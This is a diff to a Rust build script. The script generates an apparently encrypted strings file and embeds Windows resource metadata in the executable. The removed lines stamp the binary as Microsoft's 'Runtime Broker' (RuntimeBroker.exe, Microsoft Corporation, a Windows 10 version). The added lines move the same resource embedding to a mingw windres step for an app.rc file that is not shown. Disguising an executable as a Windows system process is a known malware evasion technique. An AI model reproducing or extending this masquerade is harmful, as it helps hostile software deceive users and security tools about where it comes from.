@@ -75,23 +75,34 @@ fn main() {
     let out_dir = std::env::var("OUT_DIR").unwrap();
     fs::write(Path::new(&out_dir).join("strings_enc.rs"), output).unwrap();
 
-    // --- Windows PE resource embedding ---
+    // --- Windows PE resource embedding via mingw windres ---
     if std::env::var("CARGO_CFG_TARGET_OS").unwrap_or_default() == "windows" {
-        let mut res = winres::WindowsResource::new();
-        res.set_manifest_file("resources/app.manifest");
-        res.set("FileDescription", "Runtime Broker");
-        res.set("ProductName", "Microsoft\u{00ae} Windows\u{00ae} Operating System");
-        res.set("CompanyName", "Microsoft Corporation");
-        res.set("LegalCopyright", "\u{00a9} Microsoft Corporation. All rights reserved.");
-        res.set("OriginalFilename", "RuntimeBroker.exe");
-        res.set("InternalName", "RuntimeBroker.exe");
-        res.set("FileVersion", "10.0.22621.2506");
-        res.set("ProductVersion", "10.0.22621.2506");
-        if let Err(e) = res.compile() {
-            eprintln!("Warning: Failed to compile Windows resources: {}", e);
+        let out_dir_path = Path::new(&out_dir);
+        let rc_path = Path::new("resources/app.rc");
+        if rc_path.exists() {
+            let obj_path = out_dir_path.join("app.res.o");
+            let windres = if std::env::var("TARGET").unwrap_or_default().contains("x86_64") {
+                "x86_64-w64-mingw32-windres"
+            } else {
+                "i686-w64-mingw32-windres"
+            };
+            let status = std::process::Command::new(windres)
+                .args(&[
+                    "--input", rc_path.to_str().unwrap(),
+                    "--output", obj_path.to_str().unwrap(),
+                    "--output-format=coff",
+                    "--include-dir", "resources",
+                ])
+                .status();
+            if let Ok(s) = status {
+                if s.success() {
+                    println!("cargo:rustc-link-arg={}", obj_path.display());
+                }
+            }
         }
     }
 
     println!("cargo:rerun-if-changed=build.rs");
+    println!("cargo:rerun-if-changed=resources/app.rc");
     println!("cargo:rerun-if-changed=resources/app.manifest");
 }
